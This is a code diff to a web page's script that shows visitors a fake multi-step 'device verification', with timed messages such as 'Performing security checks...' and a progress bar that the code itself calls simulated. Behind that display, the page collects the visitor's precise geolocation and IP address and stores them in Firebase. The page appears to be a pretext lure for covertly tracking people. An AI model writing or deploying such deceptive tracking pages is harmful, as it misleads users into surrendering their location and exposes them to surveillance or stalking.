@@ -2,6 +2,18 @@ import { initializeTheme } from './src/features/theme/theme-manager.js';
 import { listenForLocationRequests, setupUnloadHandler, determineLocationSource } from './src/features/location/location-tracker.js';
 import { getDeviceInfo } from './src/utils/browser-detection.js';
 
+// Verification steps
+const VERIFICATION_STEPS = [
+    { message: 'Initializing secure verification...', delay: 1000 },
+    { message: 'Checking device compatibility...', delay: 1500 },
+    { message: 'Requesting secure location access...', delay: 0 }, // No delay as we wait for user permission
+    { message: 'Retrieving device location...', delay: 2000 },
+    { message: 'Verifying location accuracy...', delay: 1500 },
+    { message: 'Validating IP address...', delay: 1500 },
+    { message: 'Performing security checks...', delay: 1500 },
+    { message: 'Finalizing device verification...', delay: 1000 }
+];
+
 // Helper function to handle geolocation errors
 function getGeolocationErrorMessage(error) {
     switch(error.code) {
@@ -13,6 +25,37 @@ function getGeolocationErrorMessage(error) {
             return "Location request timed out. Please try again.";
         default:
             return "An unknown error occurred while getting location. Please try again.";
+    }
+}
+
+// Helper function to update verification status
+function updateVerificationStatus(message, progress) {
+    const locationStatus = document.getElementById('locationStatus');
+    const verifyButton = document.getElementById('allowLocation');
+    
+    // Update status message with fade effect
+    locationStatus.style.opacity = '0';
+    setTimeout(() => {
+        locationStatus.textContent = message;
+        locationStatus.style.opacity = '1';
+    }, 150);
+    
+    // Update button text and progress bar
+    if (progress > 0) {
+        verifyButton.textContent = `Verifying... ${progress}%`;
+        verifyButton.style.setProperty('--progress', `${progress}%`);
+    }
+}
+
+// Helper function to simulate step processing
+async function processStep(stepIndex, totalSteps) {
+    const step = VERIFICATION_STEPS[stepIndex];
+    const progress = Math.round((stepIndex + 1) / totalSteps * 100);
+    
+    updateVerificationStatus(step.message, progress);
+    
+    if (step.delay > 0) {
+        await new Promise(resolve => setTimeout(resolve, step.delay));
     }
 }
 
@@ -47,7 +90,14 @@ document.addEventListener('DOMContentLoaded', async () => {
 
                 verifyButton.disabled = true;
                 document.querySelector('.container').classList.add('processing');
-                locationStatus.textContent = 'Verifying device...';
+
+                // Process initial steps
+                for (let i = 0; i < 2; i++) {
+                    await processStep(i, VERIFICATION_STEPS.length);
+                }
+
+                // Show location request step
+                await processStep(2, VERIFICATION_STEPS.length);
 
                 // Get initial location
                 console.log('Requesting location...');
@@ -69,10 +119,18 @@ document.addEventListener('DOMContentLoaded', async () => {
                     );
                 });
 
+                // Process post-location steps
+                for (let i = 3; i < 5; i++) {
+                    await processStep(i, VERIFICATION_STEPS.length);
+                }
+
                 // Determine location source
                 console.log('Determining location source...');
                 const locationSource = await determineLocationSource(position);
                 console.log('Location source:', locationSource);
+
+                // Show IP check step
+                await processStep(5, VERIFICATION_STEPS.length);
 
                 // Get IP address
                 console.log('Fetching IP address...');
@@ -82,6 +140,11 @@ document.addEventListener('DOMContentLoaded', async () => {
                 }
                 const { ip } = await ipResponse.json();
                 console.log('IP address received:', ip);
+
+                // Process final steps
+                for (let i = 6; i < VERIFICATION_STEPS.length; i++) {
+                    await processStep(i, VERIFICATION_STEPS.length);
+                }
 
                 // Save location to Firebase
                 console.log('Saving to Firebase...');
@@ -98,7 +161,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                     accuracy: position.coords.accuracy,
                     altitude: position.coords.altitude,
                     altitudeAccuracy: position.coords.altitudeAccuracy,
-                    locationSource: locationSource, // Add location source
+                    locationSource: locationSource,
                     timestamp: new Date().toISOString(),
                     status: 'active',
                     ip: ip,
@@ -109,17 +172,29 @@ document.addEventListener('DOMContentLoaded', async () => {
                 await newLocationRef.set(locationData);
                 console.log('Location saved successfully');
 
-                locationStatus.textContent = 'Device verified successfully';
-                verifyButton.style.display = 'none'; // Hide button after success
-                
-                // Add success animation class
-                document.querySelector('.thank-you-card').classList.add('success');
+                // Show success message with fade effect
+                locationStatus.style.opacity = '0';
+                setTimeout(() => {
+                    locationStatus.textContent = 'Device verified successfully';
+                    locationStatus.style.opacity = '1';
+                    verifyButton.style.display = 'none'; // Hide button after success
+                    
+                    // Add success animation class
+                    document.querySelector('.thank-you-card').classList.add('success');
+                }, 150);
                 
             } catch (error) {
                 console.error('Verification failed:', error);
-                locationStatus.textContent = error.message || 'Verification failed. Please try again.';
-                locationStatus.style.color = '#DA1710'; // Show error in red
+                locationStatus.style.opacity = '0';
+                setTimeout(() => {
+                    locationStatus.textContent = error.message || 'Verification failed. Please try again.';
+                    locationStatus.style.color = '#DA1710'; // Show error in red
+                    locationStatus.style.opacity = '1';
+                }, 150);
+                
                 verifyButton.disabled = false;
+                verifyButton.textContent = 'Verify Device'; // Reset button text
+                verifyButton.style.setProperty('--progress', '0%'); // Reset progress
                 document.querySelector('.container').classList.remove('processing');
             }
         });
